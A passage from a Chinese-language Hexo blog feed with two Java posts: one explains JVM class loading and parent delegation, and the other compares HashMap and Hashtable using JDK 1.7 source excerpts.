src="https://upload-images.jianshu.io/upload_images/15531792-64d0c278e112da14.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h4><p>类的生命周期包括：<strong>加载、链接、初始化、使用和卸载</strong>，其中加载、链接、初始化，属于类加载的过程，我们下面仔细讲解。使用是指我们new对象进行使用，卸载指对象被垃圾回收掉了。</p><h4 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h4><ul><li><strong>第一步：Loading加载</strong><br>通过类的全限定名（包名 + 类名），获取到该类的.class文件的二进制字节流<br>将二进制字节流所代表的静态存储结构，转化为方法区运行时的数据结构</li></ul><p>在内存中生成一个代表该类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口</p><p>总结：加载二进制数据到内存 —&gt; 映射成jvm能识别的结构 —&gt; 在内存中生成class文件。</p><ul><li><strong>第二步：Linking链接</strong><br>链接是指将上面创建好的class类合并至Java虚拟机中，使之能够执行的过程，可分为验证、准备、解析三个阶段。</li></ul><p>① 验证（Verify）</p><blockquote><p>确保class文件中的字节流包含的信息，符合当前虚拟机的要求，保证这个被加载的class类的正确性，不会危害到虚拟机的安全。</p></blockquote><p>② 准备（Prepare）</p><blockquote><p>为类中的<strong>静态字段</strong>分配内存，并设置默认的初始值，比如int类型初始值是0。被final修饰的static字段不会设置，因为final在编译的时候就分配了</p></blockquote><p>③ 解析（Resolve）</p><blockquote><p>解析阶段的目的，<strong>是将<code>常量池</code>内的符号引用转换为直接引用的过程（将常量池内的符号引用解析成为实际引用）</strong>。如果符号引用指向一个未被加载的类，或者未被加载类的字段或方法，那么解析将触发这个类的加载（但未必触发这个类的链接以及初始化。<br>事实上，解析器操作往往会伴随着 JVM 在执行完初始化之后再执行。 符号引用就是一组符号来描述所引用的目标。符号引用的字面量形式明确定义在《Java 虚拟机规范》的Class文件格式中。直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。<br><br>解析动作主要针对类、接口、字段、类方法、接口方法、方法类型等。对应常量池中的 CONSTANT_Class_info、CONSTANT_Fieldref_info、CONSTANT_Methodref_info等。</p></blockquote><ul><li><strong>第三步：initialization初始化</strong><blockquote><p>初始化就是执行类的**构造器方法init()**的过程。<br>这个方法不需要定义，是javac编译器自动收集类中所有类变量的赋值动作和静态代码块中的语句合并来的。<br><br>若该类具有父类，jvm会保证父类的init先执行，然后在执行子类的init。</p></blockquote></li></ul><h4 id="类加载器的分类"><a href="#类加载器的分类" class="headerlink" title="类加载器的分类"></a>类加载器的分类</h4><p><img src="https://upload-images.jianshu.io/upload_images/15531792-8c05999c52e58dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>第一个：启动类/引导类：Bootstrap ClassLoader</strong></p><blockquote><p><strong>这个类加载器使用C/C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。</strong><br>它用来加载Java核心类库，如：JAVA_HOME/jre/lib/rt.jar、resources.jar、sun.boot.class.path路径下的包，用于提供jvm运行所需的包。<br><br><strong>并不是继承自java.lang.ClassLoader，它没有父类加载器</strong><br><br>它加载扩展类加载器和应用程序类加载器，并成为他们的父类加载器<br><br>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p></blockquote><p><strong>第二个：扩展类加载器：Extension ClassLoader</strong></p><blockquote><p>Java语言编写，由sun.misc.Launcher$ExtClassLoader实现，我们可以用Java程序操作这个加载器<br>派生继承自java.lang.ClassLoader，父类加载器为启动类加载器<br><br>从系统属性：java.ext.dirs目录中加载类库，或者从JDK安装目录：jre/lib/ext目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p></blockquote><p><strong>第三个：应用程序类加载器：Application Classloader</strong></p><blockquote><p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自java.lang.ClassLoader，父类加载器为启动类加载器<br><br>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库<br><br><strong>它是程序中默认的类加载器，我们Java程序中的类，都是由它加载完成的。</strong><br><br>我们可以通过ClassLoader#getSystemClassLoader()获取并操作这个加载器</p></blockquote><p><strong>第四个：自定义加载器</strong></p><blockquote><p>一般情况下，以上3种加载器能满足我们日常的开发工作，不满足时，我们还可以自定义加载器<br>比如用网络加载Java类，为了保证传输中的安全性，采用了加密操作，那么以上3种加载器就无法加载这个类，这时候就需要自定义加载器。</p></blockquote><p><strong>自定义加载器实现步骤</strong></p><blockquote><p>继承java.lang.ClassLoader类，重写findClass()方法<br>如果没有太复杂的需求，可以直接继承URLClassLoader类，重写loadClass方法，具体可参考AppClassLoader和ExtClassLoader。</p></blockquote><p><strong>获取ClassLoader几种方式</strong></p><p>它是一个抽象类，其后所有的类加载器继承自 ClassLoader（不包括启动类加载器）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 方式一：获取当前类的 ClassLoader</span><br><span class="line">clazz.getClassLoader()</span><br><span class="line">&#x2F;&#x2F; 方式二：获取当前线程上下文的 ClassLoader</span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line">&#x2F;&#x2F; 方式三：获取系统的 ClassLoader</span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line">&#x2F;&#x2F; 方式四：获取调用者的 ClassLoader</span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h1 id="类加载机制—双亲委派机制"><a href="#类加载机制—双亲委派机制" class="headerlink" title="类加载机制—双亲委派机制"></a>类加载机制—双亲委派机制</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p><p>在加载类的时候，是采用的双亲委派机制，即把请求交给父类处理的一种任务委派模式。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-1592512b6feb81b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>（1）如果一个类加载器接收到了类加载的请求，它自己不会先去加载，会把这个请求委托给父类加载器去执行。</p><p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到启动类加载器：Bootstrap ClassLoader</p><p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出ClassNotFoundException异常，这就是双亲委派模式</p><h4 id="第三方包加载方式：反向委派机制"><a href="#第三方包加载方式：反向委派机制" class="headerlink" title="第三方包加载方式：反向委派机制"></a>第三方包加载方式：反向委派机制</h4><p>在Java应用中存在着很多服务提供者接口（Service Provider Interface，SPI），这些接口允许第三方为它们提供实现，如常见的 SPI 有 JDBC、JNDI等，这些 SPI 的接口属于 Java 核心库，一般存在rt.jar包中，由Bootstrap类加载器加载。而Bootstrap类加载器无法直接加载SPI的实现类，同时由于双亲委派模式的存在，Bootstrap类加载器也无法反向委托AppClassLoader加载器SPI的实现类。在这种情况下，我们就需要一种特殊的类加载器来加载第三方的类库，而线程上下文类加载器（双亲委派模型的破坏者）就是很好的选择。</p><p>从图可知rt.jar核心包是有Bootstrap类加载器加载的，其内包含SPI核心接口类，由于SPI中的类经常需要调用外部实现类的方法，而jdbc.jar包含外部实现类(jdbc.jar存在于classpath路径)无法通过Bootstrap类加载器加载，因此只能委派线程上下文类加载器把jdbc.jar中的实现类加载到内存以便SPI相关类使用。显然这种线程上下文类加载器的加载方式破坏了“双亲委派模型”，它在执行过程中抛弃双亲委派加载链模式，使程序可以逆向使用类加载器，当然这也使得Java类加载器变得更加灵活。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-37853219eaf490c9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="沙箱安全机制"><a href="#沙箱安全机制" class="headerlink" title="沙箱安全机制"></a>沙箱安全机制</h4><p>自定义 String 类，但是在加载自定义 String 类的时候会率先使用引导类加载器加载，而引导类加载器在加载的过程中会先加载 JDK 自带的文件（rt.jar 包中的 javalangString.class），报错信息说没有 main 方法就是因为加载的 rt.jar 包中的 String 类。这样可以保证对 Java 核心源代码的保护，这就是沙箱安全机制。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap 和 HashTable 的区别</title>
      <link href="/2021/08/08/HashMap-%E5%92%8C-HashTable-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2021/08/08/HashMap-%E5%92%8C-HashTable-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://juejin.cn/post/6844903925460500487">HashMap和Hashtable的详细区别</a></p><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><h4 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1.安全性"></a>1.安全性</h4><p>Hashtable是线程安全，HashMap是非线程安全。HashMap的性能会高于Hashtable，我们平时使用时若无特殊需求建议使用HashMap，在多线程环境下若使用HashMap需要使用Collections.synchronizedMap()方法来获取一个线程安全的集合（Collections.synchronizedMap()实现原理是Collections定义了一个SynchronizedMap的内部类，这个类实现了Map接口，在调用方法时使用synchronized来保证线程同步</p><h4 id="2-是否可以使用null作为key"><a href="#2-是否可以使用null作为key" class="headerlink" title="2. 是否可以使用null作为key"></a>2. 是否可以使用null作为key</h4><p>HashMap可以使用null作为key，不过建议还是尽量避免这样使用。HashMap以null作为key时，总是存储在table数组的第一个节点上。而Hashtable则不允许null作为key</p><h4 id="3-继承了什么，实现了什么"><a href="#3-继承了什么，实现了什么" class="headerlink" title="3. 继承了什么，实现了什么"></a>3. 继承了什么，实现了什么</h4><p>HashMap继承了AbstractMap，HashTable继承Dictionary抽象类，两者均实现Map接口</p><h4 id="4-默认容量及如何扩容"><a href="#4-默认容量及如何扩容" class="headerlink" title="4.默认容量及如何扩容"></a>4.默认容量及如何扩容</h4><p>HashMap的初始容量为16，Hashtable初始容量为11，两者的填充因子默认都是0.75。HashMap扩容时是当前容量翻倍即:capacity  2，Hashtable扩容时是容量翻倍+1即:capacity  (2+1)</p><h4 id="5-底层实现"><a href="#5-底层实现" class="headerlink" title="5.底层实现"></a>5.底层实现</h4><p>HashMap和Hashtable的底层实现都是<code>数组+链表</code>结构实现</p><h4 id="6-计算hash的方法不同"><a href="#6-计算hash的方法不同" class="headerlink" title="6.计算hash的方法不同"></a>6.计算hash的方法不同</h4><p>Hashtable计算hash是直接使用key的hashcode对table数组的长度直接进行取模<br>HashMap计算hash对key的hashcode进行了二次hash，以获得更好的散列值，然后对table数组长度取模</p><h1 id="详述"><a href="#详述" class="headerlink" title="详述"></a>详述</h1><p>参考文章：<a href="https://link.juejin.cn/?target=https://www.cnblogs.com/xinzhao/p/5644175.html" title="https://www.cnblogs.com/xinzhao/p/5644175.html">www.cnblogs.com/xinzhao/p/5…</a></p><p>HashMap和HashTable有什么不同？在面试和被面试的过程中，我问过也被问过这个问题，也见过了不少回答，今天决定写一写自己心目中的理想答案。</p><h4 id="代码版本"><a href="#代码版本" class="headerlink" title="代码版本"></a>代码版本</h4><p>JDK每一版本都在改进。本文讨论的HashMap和HashTable基于JDK 1.7.0_67。源码见<a href="https://github.com/ZhaoX/jdk-1.7-annotated">这里</a></p><h4 id="1-时间"><a href="#1-时间" class="headerlink" title="1. 时间"></a>1. 时间</h4><p>HashTable产生于JDK 1.1，而HashMap产生于JDK 1.2。从时间的维度上来看，HashMap要比HashTable出现得晚一些。</p><h4 id="2-作者"><a href="#2-作者" class="headerlink" title="2. 作者"></a>2. 作者</h4><p>以下是HashTable的作者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">* @author  Arthur van Hoff</span><br><span class="line">* @author  Josh Bloch</span><br><span class="line">* @author  Neal Gafter</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是HashMap的作者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashMap</span><br><span class="line"></span><br><span class="line"> * @author  Doug Lea</span><br><span class="line"> * @author  Josh Bloch</span><br><span class="line"> * @author  Arthur van Hoff</span><br><span class="line"> * @author  Neal Gafter</span><br></pre></td></tr></table></figure><p>可以看到HashMap的作者多了大神Doug Lea。不了解Doug Lea的，可以看<a href="https://link.juejin.cn/?target=https://en.wikipedia.org/wiki/Doug_Lea" title="https://en.wikipedia.org/wiki/Doug_Lea">这里</a>。</p><h4 id="3-对外的接口（API）"><a href="#3-对外的接口（API）" class="headerlink" title="3. 对外的接口（API）"></a>3. 对外的接口（API）</h4><p>HashMap和HashTable都是基于哈希表来实现键值映射的工具类。讨论他们的不同，我们首先来看一下他们暴露在外的API有什么不同。</p><h5 id="3-1-Public-Method"><a href="#3-1-Public-Method" class="headerlink" title="3.1 Public Method"></a>3.1 Public Method</h5><p>下面两张图，我画出了HashMap和HashTable的类继承体系，并列出了这两个类的可供外部调用的公开方法。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b36d62cfcf07cd35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-abcb9bfaadcb4394.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>从图中可以看出，两个类的继承体系有些不同。虽然都实现了Map、Cloneable、Serializable三个接口。但是HashMap继承自抽象类AbstractMap，而HashTable继承自抽象类Dictionary。其中Dictionary类是一个已经被废弃的类，这一点我们可以从它代码的注释中看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.Dictionary</span><br><span class="line"></span><br><span class="line"> * &lt;strong&gt;NOTE: This class is obsolete.  New implementations should</span><br><span class="line"> * implement the Map interface, rather than extending this class.&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时我们看到HashTable比HashMap多了两个公开方法。一个是elements，这来自于抽象类Dictionary，鉴于该类已经废弃，所以这个方法也就没什么用处了。另一个多出来的方法是contains，这个多出来的方法也没什么用，因为它跟containsValue方法功能是一样的。代码为证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line"> public synchronized boolean contains(Object value) &#123;</span><br><span class="line">     if (value &#x3D;&#x3D; null) &#123;</span><br><span class="line">         throw new NullPointerException();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Entry tab[] &#x3D; table;</span><br><span class="line">     for (int i &#x3D; tab.length ; i-- &gt; 0 ;) &#123;</span><br><span class="line">         for (Entry&lt;K,V&gt; e &#x3D; tab[i] ; e !&#x3D; null ; e &#x3D; e.next) &#123;</span><br><span class="line">             if (e.value.equals(value)) &#123;</span><br><span class="line">                 return true;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return false;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> public boolean containsValue(Object value) &#123;</span><br><span class="line">     return contains(value);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>所以从公开的方法上来看，这两个类提供的，是一样的功能。都提供键值映射的服务，可以增、删、查、改键值对，可以对建、值、键值对提供遍历视图。支持浅拷贝，支持序列化。</p><h4 id="3-2-Null-Key-amp-Null-Value"><a href="#3-2-Null-Key-amp-Null-Value" class="headerlink" title="3.2 Null Key &amp; Null Value"></a>3.2 Null Key &amp; Null Value</h4><p>HashMap是支持null键和null值的，而HashTable在遇到null时，会抛出NullPointerException异常。这并不是因为HashTable有什么特殊的实现层面的原因导致不能支持null键和null值，这仅仅是因为HashMap在实现时对null做了特殊处理，将null的hashCode值定为了0，从而将其存放在哈希表的第0个bucket中。我们一put方法为例，看一看代码的细节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">public synchronized V put(K key, V value) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果value为null，抛出NullPointerException</span><br><span class="line">    if (value &#x3D;&#x3D; null) &#123;</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果key为null，在调用key.hashCode()时抛出NullPointerException</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HasMap</span><br><span class="line"></span><br><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    if (table &#x3D;&#x3D; EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 当key为null时，调用putForNullKey特殊处理</span><br><span class="line">    if (key &#x3D;&#x3D; null)</span><br><span class="line">        return putForNullKey(value);</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private V putForNullKey(V value) &#123;</span><br><span class="line">    &#x2F;&#x2F; key为null时，放到table[0]也就是第0个bucket中</span><br><span class="line">    for (Entry&lt;K,V&gt; e &#x3D; table[0]; e !&#x3D; null; e &#x3D; e.next) &#123;</span><br><span class="line">        if (e.key &#x3D;&#x3D; null) &#123;</span><br><span class="line">            V oldValue &#x3D; e.value;</span><br><span class="line">            e.value &#x3D; value;</span><br><span class="line">            e.recordAccess(this);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(0, null, value, 0);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-实现原理"><a href="#4-实现原理" class="headerlink" title="4. 实现原理"></a>4. 实现原理</h4><p>本节讨论HashMap和HashTable在数据结构和算法层面，有什么不同。</p><h5 id="4-1-数据结构"><a href="#4-1-数据结构" class="headerlink" title="4.1 数据结构"></a>4.1 数据结构</h5><p>HashMap和HashTable都使用哈希表来存储键值对。在数据结构上是基本相同的，都创建了一个继承自Map.Entry的私有的内部类Entry，每一个Entry对象表示存储在哈希表中的一个键值对。<br>Entry对象唯一表示一个键值对，有四个属性：</p><ul><li>K key 键对象</li><li>V value 值对象</li><li>int hash 键对象的hash值</li><li>Entry entry 指向链表中下一个Entry对象，可为null，表示当前Entry对象在链表尾部</li></ul><p>可以说，有多少个键值对，就有多少个Entry对象，那么在HashMap和HashTable中是怎么存储这些Entry对象，以方便我们快速查找和修改的呢？请看下图。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3ba0c29f9a46e000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上图画出的是一个桶数量为8，存有5个键值对的HashMap/HashTable的内存布局情况。可以看到HashMap/HashTable内部创建有一个Entry类型的引用数组，用来表示哈希表，数组的长度，即是哈希桶的数量。而数组的每一个元素都是一个Entry引用，从Entry对象的属性里，也可以看出其是链表的节点，每一个Entry对象内部又含有另一个Entry对象的引用。<br>这样就可以得出结论，HashMap/HashTable内部用Entry数组实现哈希表，而对于映射到同一个哈希桶（数组的同一个位置）的键值对，使用Entry链表来存储(解决hash冲突)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * The hash table data.</span><br><span class="line"> *&#x2F;</span><br><span class="line">private transient Entry&lt;K,V&gt;[] table;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashMap</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * The table, resized as necessary. Length MUST Always be a power of two.</span><br><span class="line"> *&#x2F;</span><br><span class="line">transient Entry&lt;K,V&gt;[] table &#x3D; (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码可以看到，对于哈希桶的内部表示，两个类的实现是一致的。</p><h5 id="4-2-算法"><a href="#4-2-算法" class="headerlink" title="4.2 算法"></a>4.2 算法</h5><p>上一小节已经说了用来表示哈希表的内部数据结构。HashMap/HashTable还需要有算法来将给定的键key，映射到确定的hash桶（数组位置）。需要有算法在哈希桶内的键值对多到一定程度时，扩充哈希表的大小（数组的大小）。本小节比较这两个类在算法层面有哪些不同。<br>初始容量大小和每次扩充容量大小的不同。先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 哈希表默认初始大小为11</span><br><span class="line">public Hashtable() &#123;</span><br><span class="line">    this(11, 0.75f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected void rehash() &#123;</span><br><span class="line">    int oldCapacity &#x3D; table.length;</span><br><span class="line">    Entry&lt;K,V&gt;[] oldMap &#x3D; table;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 每次扩容为原来的2n+1</span><br><span class="line">    int newCapacity &#x3D; (oldCapacity &lt;&lt; 1) + 1;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashMap</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 哈希表默认初始大小为2^4&#x3D;16</span><br><span class="line">static final int DEFAULT_INITIAL_CAPACITY &#x3D; 1 &lt;&lt; 4; &#x2F;&#x2F; aka 16</span><br><span class="line"></span><br><span class="line">void addEntry(int hash, K key, V value, int bucketIndex) &#123;</span><br><span class="line">    &#x2F;&#x2F; 每次扩充为原来的2n </span><br><span class="line">    if ((size &gt;&#x3D; threshold) &amp;&amp; (null !&#x3D; table[bucketIndex])) &#123;</span><br><span class="line">       resize(2 * table.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到HashTable默认的初始大小为11，之后每次扩充为原来的2n+1。HashMap默认的初始化大小为16，之后每次扩充为原来的2倍。还有我没列出代码的一点，就是如果在创建时给定了初始化大小，那么HashTable会直接使用你给定的大小，而HashMap会将其扩充为2的幂次方大小。</p><p>也就是说HashTable会尽量使用素数、奇数。而HashMap则总是使用2的幂作为哈希表的大小。我们知道当哈希表的大小为素数时，简单的取模哈希的结果会更加均匀（具体证明，见这篇<a href="https://link.juejin.cn/?target=http://zhaox.github.io/algorithm/2015/06/29/hash" title="http://zhaox.github.io/algorithm/2015/06/29/hash">文章</a>），所以单从这一点上看，HashTable的哈希表大小选择，似乎更高明些。但另一方面我们又知道，在取模计算时，如果模数是2的幂，那么我们可以直接使用位运算来得到结果，效率要大大高于做除法。所以从hash计算的效率上，又是HashMap更胜一筹。</p><p>所以，事实就是HashMap为了加快hash的速度，将哈希表的大小固定为了2的幂。当然这引入了哈希分布不均匀的问题，所以HashMap为解决这问题，又对hash算法做了一些改动。具体我们来看看，在获取了key对象的hashCode之后，HashTable和HashMap分别是怎样将他们hash到确定的哈希桶（Entry数组位置）中的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashTable</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; hash 不能超过Integer.MAX_VALUE 所以要取其最小的31个bit</span><br><span class="line">int hash &#x3D; hash(key);</span><br><span class="line">int index &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 直接计算key.hashCode()</span><br><span class="line">private int hash(Object k) &#123;</span><br><span class="line">    &#x2F;&#x2F; hashSeed will be zero if alternative hashing is disabled.</span><br><span class="line">    return hashSeed ^ k.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以下代码及注释来自java.util.HashMap</span><br><span class="line">int hash &#x3D; hash(key);</span><br><span class="line">int i &#x3D; indexFor(hash, table.length);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在计算了key.hashCode()之后，做了一些位运算来减少哈希冲突</span><br><span class="line">final int hash(Object k) &#123;</span><br><span class="line">    int h &#x3D; hashSeed;</span><br><span class="line">    if (0 !&#x3D; h &amp;&amp; k instanceof String) &#123;</span><br><span class="line">        return sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^&#x3D; k.hashCode();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; This function ensures that hashCodes that differ only by</span><br><span class="line">    &#x2F;&#x2F; constant multiples at each bit position have a bounded</span><br><span class="line">    &#x2F;&#x2F; number of collisions (approximately 8 at default load factor).</span><br><span class="line">    h ^&#x3D; (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);</span><br><span class="line">    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 取模不再需要做除法</span><br><span class="line">static int indexFor(int h, int length) &#123;</span><br><span class="line">    &#x2F;&#x2F; assert Integer.bitCount(length) &#x3D;&#x3D; 1 : &quot;length must be a non-zero power of 2&quot;;</span><br><span class="line">    return h &amp; (length-1);</span><br><span 